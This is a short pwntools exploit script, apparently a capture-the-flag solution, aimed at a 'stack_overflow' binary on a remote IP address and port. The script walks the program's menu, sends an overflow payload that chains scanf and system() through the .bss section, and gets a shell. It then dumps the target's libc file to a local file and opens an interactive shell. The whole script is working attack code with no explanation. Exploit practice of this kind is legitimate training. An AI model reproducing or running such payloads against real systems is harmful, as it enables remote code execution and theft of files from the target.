from pwn import *

#io = process('./stack_overflow')

io = remote ('218.76.35.75',4545)
e = ELF('./stack_overflow')

io.recvuntil('quit\n')
io.sendline('1')
io.recvuntil('quit\n')


io.sendline('2')
io.recvuntil('edit\n')
io.sendline('0')
io.recvuntil('name:\n')
io.sendline('AAAA')
io.recvuntil('items:\n')

scanf_plt = 0x08048530
_s = 0x08048C17
_bss = 0x8049358

payload = 'A'*28 + p32(0) + 'A'*20
payload += p32(scanf_plt) + p32(e.plt['system']) + p32(_s) + p32(_bss)

#gdb.attach(io)
io.sendline(payload)

io.sendline('/bin/sh')

io.sendline('cat   /lib/i386-linux-gnu/libc.so.6; exit')

buf = io.recvall()
open('libc','wb').write(buf)
print 'OK'

io.interactive()